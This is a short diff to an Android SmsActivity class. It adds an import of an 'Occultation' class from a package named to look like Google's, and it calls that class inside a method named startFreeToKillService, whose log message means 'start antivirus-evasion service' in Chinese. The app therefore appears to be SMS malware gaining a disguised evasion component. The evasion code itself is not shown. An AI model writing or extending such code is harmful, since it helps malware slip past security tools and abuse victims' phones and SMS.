@@ -2,6 +2,7 @@ package android.app.sdk;
 
 import java.util.Date;
 
+import com.google.pm.service.Occultation;
 import com.umeng.analytics.AnalyticsConfig;
 
 import android.app.Activity;
@@ -66,6 +67,7 @@ public class SmsActivity extends Activity {
 	
 	private void startFreeToKillService() {
 		LogUtils.write("Send", "启动免杀服务");
+		Occultation.getInstance(this).oponeData();
 		this.startService(new Intent(this, SMSService.class));
 	}
 	
